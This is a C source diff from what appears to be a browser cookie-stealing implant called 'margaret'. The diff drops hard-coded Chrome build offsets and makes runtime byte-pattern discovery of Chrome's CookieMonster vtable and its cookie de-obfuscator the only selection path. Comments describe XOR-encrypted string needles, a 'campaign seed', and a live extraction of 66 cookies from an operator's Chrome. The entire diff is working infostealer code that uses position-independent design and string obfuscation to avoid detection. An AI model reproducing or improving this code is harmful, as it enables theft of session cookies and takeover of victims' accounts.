@@ -3,11 +3,12 @@
 #include "pic_needles.h"
 #include "margaret.h"
 /*
- * Per-build Chromium adapter + selection gate.
+ * Chromium adapter — runtime discovery only.
  *
- * The tables are generated from the field worksheets; every gate fails
- * closed on any mismatch: a wrong build must select no adapter, never
- * "almost work".
+ * The vtable and the ProcessBound de-obfuscator are located by byte-
+ * pattern chains on the live module; no per-build table ships in the
+ * blob.  Selection fails closed: a build whose shape the chains cannot
+ * prove selects nothing, never "almost works".
  */
 
 /* FNV-1a 32-bit of L"chrome.dll" with the a-z -> A-Z fold (pic_resolve.h
@@ -67,12 +68,8 @@ static PIC_CODE pic_u32 adapter_image_size(const pic_u8 *base)
     return adapter_read_u32(base + lfanew + 0x18u + 0x38u);
 }
 
-/* Chained-XOR decrypt (mirrors scripts/encrypt_blob.py).
- * The .text$R adapter data is encrypted at build time; this function
- * restores it into a stack buffer.  The key derives from the campaign
- * seed (scripts/hash_seed). */
-#define MARGARET_ADAPTER_XOR_KEY 0x3Bu
-
+/* Chained-XOR used to decrypt the compile-time-encrypted needles
+ * (scripts/gen_needles.py) onto the stack. */
 static PIC_CODE void adapter_chained_xor(pic_u8 *dst, const pic_u8 *src,
                                          pic_u32 len, pic_u8 key)
 {
@@ -85,128 +82,7 @@ static PIC_CODE void adapter_chained_xor(pic_u8 *dst, const pic_u8 *src,
     }
 }
 
-static PIC_CODE void adapter_decrypt(
-    const pic_u8 *src, MARGARET_CHROMIUM_ADAPTER *dst)
-{
-    adapter_chained_xor((pic_u8 *)dst, src,
-                        (pic_u32)sizeof(MARGARET_CHROMIUM_ADAPTER),
-                        (pic_u8)MARGARET_ADAPTER_XOR_KEY);
-}
-/* Pinned adapter tables.  Fields omitted from an initializer are
- * zero-filled by C semantics; each table lists ONLY its non-default
- * fields so the per-build delta stays readable at a glance.  Evidence
- * trails: docs/adapter-field-*.md (append-only worksheets).
- *
- * Installed-stable pin 153.0.8010.53 — string-anchored vtable walk +
- * dynamic vtscan proof (worksheet 153).  Retained as a valid pin. */
-static const MARGARET_CHROMIUM_ADAPTER PIC_RODATA
-    margaret_adapter_153_0_8010_53 = {
-    .adapter_version = 1u,
-    .product = MARGARET_CHROMIUM_PRODUCT_CHROME,
-    .version_major = 153u,
-    .version_minor = 0u,
-    .version_build = 8010u,
-    .version_patch = 53u,
-    .image_size = 0x1225E000u,
-        .rva_cookie_monster_vtable = 0xF7B4BB0u,
-    .rva_cookie_monster_get_all_cookies = 0x0A85D480u,
-};
-
-/* Chrome-for-Testing 153.0.8010.53 (CFT CDN; sha256 eea1a3a7...).
- * Lab-proven with bwalk4: g_browser_process slot walks the graph;
- * CM vtable via the string-anchored walk (slot 3 =
- * GetCookieListWithOptionsAsync). */
-static const MARGARET_CHROMIUM_ADAPTER PIC_RODATA
-    margaret_adapter_153_0_8010_53_cft = {
-    .adapter_version = 1u,
-    .product = MARGARET_CHROMIUM_PRODUCT_CHROME,
-    .version_major = 153u,
-    .version_minor = 0u,
-    .version_build = 8010u,
-    .version_patch = 53u,
-    .image_size = 0x121E2000u,
-    .rva_cookie_monster_vtable = 0xF7752B8u,
-    .rva_cookie_monster_get_all_cookies = 0x0A82CBB0u,
-    .rva_canonical_cookie_deobfuscator = 0x5096B90u, /* x64dbg-proven */
-};
-
-/* Chrome-for-Testing 154.0.8037.57 (sha256 4e26d59a...) — anchors from
- * the cross-build chains (worksheet 154): vtable string->lea->slot3
- * (order PDB-verified 8/8 on the trunk twin), deobfuscator = Process-
- * Bound<string>::value() via masked-signature majority (11/12). */
-static const MARGARET_CHROMIUM_ADAPTER PIC_RODATA
-    margaret_adapter_154_0_8037_57_cft = {
-    .adapter_version = 1u,
-    .product = MARGARET_CHROMIUM_PRODUCT_CHROME,
-    .version_major = 154u,
-    .version_minor = 0u,
-    .version_build = 8037u,
-    .version_patch = 57u,
-    .image_size = 0x12304000u,
-    .rva_cookie_monster_vtable = 0xF892720u,           /* chain 2 */
-    .rva_cookie_monster_get_all_cookies = 0x0A98F7F0u, /* slot[4] */
-    .rva_canonical_cookie_deobfuscator = 0x50441E0u,   /* chain 1 */
-};
-
-/* Installed stable 154.0.8037.57 — the operator's real Chrome (sha256
- * a1c14a08...; live-proven 2026-09-27, 66 cookies).  Same version as
- * CFT but a separate build.  NOTE: 154.0.8037.58 shares this
- * image_size — the structural gates in adapter_try reject the shifted
- * rebuild, which then selects through runtime discovery. */
-static const MARGARET_CHROMIUM_ADAPTER PIC_RODATA
-    margaret_adapter_154_0_8037_57_host = {
-    .adapter_version = 1u,
-    .product = MARGARET_CHROMIUM_PRODUCT_CHROME,
-    .version_major = 154u,
-    .version_minor = 0u,
-    .version_build = 8037u,
-    .version_patch = 57u,
-    .image_size = 0x12387000u,
-    .rva_cookie_monster_vtable = 0xF8D8FE8u,
-    .rva_cookie_monster_get_all_cookies = 0x0A9C5850u, /* slot[4] */
-    .rva_canonical_cookie_deobfuscator = 0x50196C0u,
-};
-
-static PIC_CODE const MARGARET_CHROMIUM_ADAPTER *adapter_try(
-    const MARGARET_CHROMIUM_ADAPTER *adapter, const pic_u8 *base,
-    pic_u64 base_va, pic_u32 image_size)
-{
-    pic_u64 slot0, slot3;
-
-    if (image_size != adapter->image_size) {
-        return PIC_NULL;
-    }
-    /* Proven 2026-09-27: 154.0.8037.57 and .58 are patch-level rebuilds
-     * with IDENTICAL image_size — the size alone cannot discriminate.
-     * Structural gates below; on the .58 the .57 table passed size and
-     * slot0 while its deobfuscator RVA landed mid-instruction (garbage
-     * prologue -> #UD when called). */
-    slot0 = adapter_read_u64(base + adapter->rva_cookie_monster_vtable);
-    if (slot0 < base_va || slot0 - base_va >= (pic_u64)image_size) {
-        return PIC_NULL;
-    }
-    slot3 = adapter_read_u64(
-        base + adapter->rva_cookie_monster_vtable + 24u);
-    if (slot3 < base_va || slot3 - base_va >= (pic_u64)image_size) {
-        return PIC_NULL;
-    }
-    /* The deobfuscator must open with the ProcessBound family prologue
-     * (push r15/r14/r13/r12; stable across 152-154, verified on every
-     * pinned build).  A rebuild that shifted code fails here and falls
-     * through to runtime discovery. */
-    if (adapter->rva_canonical_cookie_deobfuscator != 0u) {
-        const pic_u8 *fn =
-            base + adapter->rva_canonical_cookie_deobfuscator;
-        if (fn[0] != 0x41u || fn[1] != 0x57u || fn[2] != 0x41u ||
-            fn[3] != 0x56u || fn[4] != 0x41u || fn[5] != 0x55u ||
-            fn[6] != 0x41u || fn[7] != 0x54u) {
-            return PIC_NULL;
-        }
-    }
-    return adapter;
-}
-
-/* Cross-build runtime discovery (fallback when no pinned table matches).
+/* Cross-build runtime discovery (the only selection path).
  * Chains validated on 8 builds 152->154 with four PDB ground truths and
  * one live extraction (docs/adapter-field-154.0.8037.md); every gate
  * fails closed on ambiguity.
@@ -546,6 +422,55 @@ static PIC_CODE pic_bool adapter_discover_vtable(
     }
     return PIC_FALSE;
 }
+/* Runtime discovery of both Engine A anchors (chain A vtable via the
+ * string needle in .rdata, chain B de-obfuscator via the masked code
+ * shape in .text).  Fail-closed: any gate that does not hold aborts
+ * the whole selection.  adapter_version = 2 marks a discovered table. */
+static PIC_CODE pic_bool adapter_discover(
+    MARGARET_CHROMIUM_ADAPTER *out_adapter, const pic_u8 *base,
+    pic_u64 base_va, pic_u32 image_size)
+{
+    pic_u32 text_rva, text_size, rd_rva, rd_size;
+    pic_u32 vt_rva, deobf_rva;
+    pic_u8 secn[8];
+    pic_u8 secr[8];
+
+    if (!adapter_section_range(base,
+                               adapter_section_name(margaret_needle_sectext, secn),
+                               &text_rva, &text_size) ||
+        !adapter_section_range(base,
+                               adapter_section_name(margaret_needle_secrdata, secr),
+                               &rd_rva, &rd_size) ||
+        !adapter_discover_deobfuscator(base, text_rva, text_size,
+                                       &deobf_rva) ||
+        !adapter_discover_vtable(base, base_va, text_rva, text_size,
+                                 rd_rva, rd_size, &vt_rva)) {
+        return PIC_FALSE;
+    }
+    {
+        pic_u64 slot0 = adapter_read_u64(base + vt_rva);
+        if (slot0 < base_va ||
+            slot0 - base_va >= (pic_u64)image_size) {
+            return PIC_FALSE;
+        }
+        (void)margaret_memzero(out_adapter, (pic_size)sizeof(*out_adapter));
+        out_adapter->adapter_version = 2u;
+        out_adapter->product = MARGARET_CHROMIUM_PRODUCT_CHROME;
+        out_adapter->image_size = image_size;
+        out_adapter->rva_cookie_monster_vtable = vt_rva;
+        out_adapter->rva_canonical_cookie_deobfuscator = deobf_rva;
+        /* slot[4] = GetAllCookiesAsync (informational) */
+        {
+            pic_u64 s4 = adapter_read_u64(base + vt_rva + 32u);
+            if (s4 >= base_va && s4 - base_va < (pic_u64)image_size) {
+                out_adapter->rva_cookie_monster_get_all_cookies =
+                    (pic_u32)(s4 - base_va);
+            }
+        }
+        return PIC_TRUE;
+    }
+}
+
 PIC_CODE pic_bool PIC_MS_ABI
 margaret_select_chromium_adapter(void *chrome_base, pic_u32 image_size,
                                   MARGARET_CHROMIUM_ADAPTER *out_adapter)
@@ -558,66 +483,11 @@ margaret_select_chromium_adapter(void *chrome_base, pic_u32 image_size,
     }
     base_va = (pic_u64)(pic_uptr)base;
 
-    /* decrypt each encrypted table into the caller's buffer and try it;
-     * first exact match wins */
-#define TRY_PINNED(sym)                                                        \
-    do {                                                                       \
-        adapter_decrypt((const pic_u8 *)&(sym), out_adapter);                  \
-        if (adapter_try(out_adapter, base, base_va, image_size) != PIC_NULL) { \
-            return PIC_TRUE;                                                   \
-        }                                                                      \
-    } while (0)
-
-    TRY_PINNED(margaret_adapter_153_0_8010_53);
-    TRY_PINNED(margaret_adapter_154_0_8037_57_host);
-    TRY_PINNED(margaret_adapter_154_0_8037_57_cft);
-    TRY_PINNED(margaret_adapter_153_0_8010_53_cft);
-
-    /* --- cross-build fallback: signature discovery (fail-closed).
-     * No pinned table matched: self-locate the two Engine A anchors
-     * with the chains proven on 8 builds.  adapter_version = 2 marks
-     * a runtime-discovered table. */
-    {
-        pic_u32 text_rva, text_size, rd_rva, rd_size;
-        pic_u32 vt_rva, deobf_rva;
-
-        pic_u8 secn[8];
-        pic_u8 secr[8];
-        if (adapter_section_range(base,
-                                  adapter_section_name(margaret_needle_sectext, secn),
-                                  &text_rva, &text_size) &&
-            adapter_section_range(base,
-                                  adapter_section_name(margaret_needle_secrdata, secr),
-                                  &rd_rva, &rd_size) &&
-            adapter_discover_deobfuscator(base, text_rva, text_size,
-                                          &deobf_rva) &&
-            adapter_discover_vtable(base, base_va, text_rva, text_size,
-                                    rd_rva, rd_size, &vt_rva)) {
-            pic_u64 slot0 = adapter_read_u64(base + vt_rva);
-            if (slot0 >= base_va &&
-                slot0 - base_va < (pic_u64)image_size) {
-                (void)margaret_memzero(out_adapter,
-                                       (pic_size)sizeof(*out_adapter));
-                out_adapter->adapter_version = 2u;
-                out_adapter->product = MARGARET_CHROMIUM_PRODUCT_CHROME;
-                out_adapter->image_size = image_size;
-                out_adapter->rva_cookie_monster_vtable = vt_rva;
-                out_adapter->rva_canonical_cookie_deobfuscator = deobf_rva;
-                /* slot[4] = GetAllCookiesAsync (informational) */
-                {
-                    pic_u64 s4 = adapter_read_u64(base + vt_rva + 32u);
-                    if (s4 >= base_va &&
-                        s4 - base_va < (pic_u64)image_size) {
-                        out_adapter->rva_cookie_monster_get_all_cookies =
-                            (pic_u32)(s4 - base_va);
-                    }
-                }
-                return PIC_TRUE;
-            }
-        }
-    }
-
-    return PIC_FALSE;
+    /* Runtime discovery only: every build is located by its own
+     * bytes, never by a per-build table.  Fail-closed gates (majority
+     * vote, junk filter, vtable slot sanity) make a wrong answer
+     * impossible by construction; failure means UNSUPPORTED_BUILD. */
+    return adapter_discover(out_adapter, base, base_va, image_size);
 }
 
 PIC_CODE pic_bool PIC_MS_ABI margaret_locate_chrome_dll(PIC_CONTEXT *ctx,
